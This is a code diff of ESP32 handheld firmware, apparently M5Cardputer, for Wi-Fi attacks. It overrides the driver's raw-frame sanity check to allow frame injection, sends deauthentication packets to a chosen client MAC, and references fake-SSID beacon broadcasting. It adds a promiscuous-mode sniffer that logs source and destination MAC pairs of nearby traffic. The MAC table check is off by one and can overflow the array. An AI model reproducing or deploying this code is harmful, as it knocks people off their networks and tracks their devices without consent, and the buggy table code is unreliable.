@@ -1,19 +1,20 @@
 #include "WString.h"
-#include "M5Cardputer.h"
 #include "ui.h"
-#include "src.h"
 #include "WiFi.h"
-#include "networkKit.h"         
+#include "networkKit.h"
 
 // Maksymalna liczba klientów, których można śledzić
 const int MAX_CLIENTS = 10;
 uint8_t target_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
+
+
 
 // Tablica do przechowywania adresów MAC klientów
 uint8_t clients[MAX_CLIENTS][6];
 int client_count = 0;
 int target_channel = 1;
 
+//bypass stupid wifi restrictions
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
 }
@@ -184,13 +185,13 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
 }
 
 // Funkcja wysyłająca pakiety deauth do danego klienta
-void send_deauth_packets(String &client_mac_str, int count) {
+bool send_deauth_packets(String &client_mac_str, int count) {
   uint8_t client_mac[6];
   
   // Konwersja adresu MAC z string na tablicę bajtów
   if (!convert_mac_string_to_bytes(client_mac_str, client_mac)) {
     Serial.println("Błędny format adresu MAC klienta.");
-    return;
+    return false;
   }
 
   uint8_t deauth_packet[26] = {
@@ -206,8 +207,10 @@ void send_deauth_packets(String &client_mac_str, int count) {
   esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
   if (result == ESP_OK) {
     Serial.println("Packet sent successfully.");
+    return true;
   } else {
     Serial.println("Error sending packet.");
+    return false;
   }
 }
 
@@ -327,7 +330,7 @@ void clearClients() {
     memset(clients[i], 0, 6);  // Ustaw wszystkie bajty MAC na 0
   }
   client_count = 0;  // Zresetuj licznik klientów
-  Serial.println("Tablica klientów została wyczyszczona.");
+  Serial.println("Client table cleared successfully.");
 }
 
 void set_target_channel(const char* target_ssid) {
@@ -335,13 +338,70 @@ void set_target_channel(const char* target_ssid) {
     for (int i = 0; i < networks; i++) {
         if (strcmp(WiFi.SSID(i).c_str(), target_ssid) == 0) {
             target_channel = WiFi.channel(i);
-            Serial.print("Znaleziono sieć docelową: ");
+            Serial.print("Detected target network: ");
             Serial.println(target_ssid);
-            Serial.print("Ustawiam kanał na: ");
+            Serial.print("Setting chanel to: ");
             Serial.println(target_channel);
             esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
             return;
         }
     }
-    Serial.println("Nie znaleziono sieci docelowej. Przełączanie kanałów pozostaje ręczne.");
+    Serial.println("ERROR!");
+}
+
+
+MacEntry mac_table[255];
+
+int mac_count = 0;
+
+// Funkcja do sprawdzania, czy adres MAC znajduje się w tablicy
+bool is_mac_in_table(uint8_t *src, uint8_t *dest) {
+    for (int i = 0; i < mac_count; i++) {
+        if (memcmp(mac_table[i].source, src, 6) == 0 &&
+            memcmp(mac_table[i].destination, dest, 6) == 0) {
+            return true;  // Już istnieje
+        }
+    }
+    return false;
+}
+
+// Funkcja do dodawania adresu MAC do tablicy
+void add_mac_to_table(uint8_t *src, uint8_t *dest) {
+    if (!is_mac_in_table(src, dest)) {
+        if (mac_count < 256) {
+            memcpy(mac_table[mac_count].source, src, 6);
+            memcpy(mac_table[mac_count].destination, dest, 6);
+            mac_count++;
+            Serial.print("Dodano: ");
+            Serial.printf("Źródło: %02X:%02X:%02X:%02X:%02X:%02X ", 
+                          src[0], src[1], src[2], src[3], src[4], src[5]);
+            Serial.printf("Cel: %02X:%02X:%02X:%02X:%02X:%02X\n", 
+                          dest[0], dest[1], dest[2], dest[3], dest[4], dest[5]);
+        } else {
+            Serial.println("Tablica pełna, nie można dodać więcej adresów.");
+        }
+    }
+}
+
+// Funkcja callback do nasłuchu na pakiety w trybie promiscuous
+void client_sniff_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    uint8_t *hdr = pkt->payload;
+
+    if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA || type == WIFI_PKT_CTRL) {
+        uint8_t *source_mac = hdr + 10;  // Źródło MAC (pole addr2 w nagłówku 802.11)
+        uint8_t *destination_mac = hdr + 4;  // Cel MAC (pole addr1 w nagłówku 802.11)
+
+        // Dodaj adresy MAC do tablicy
+        add_mac_to_table(source_mac, destination_mac);
+    }
+}
+
+void resetMacTable(){
+  mac_count = 0;
+}
+
+MacEntry* get_mac_table(int &count) {
+    count = mac_count;
+    return mac_table;
 }
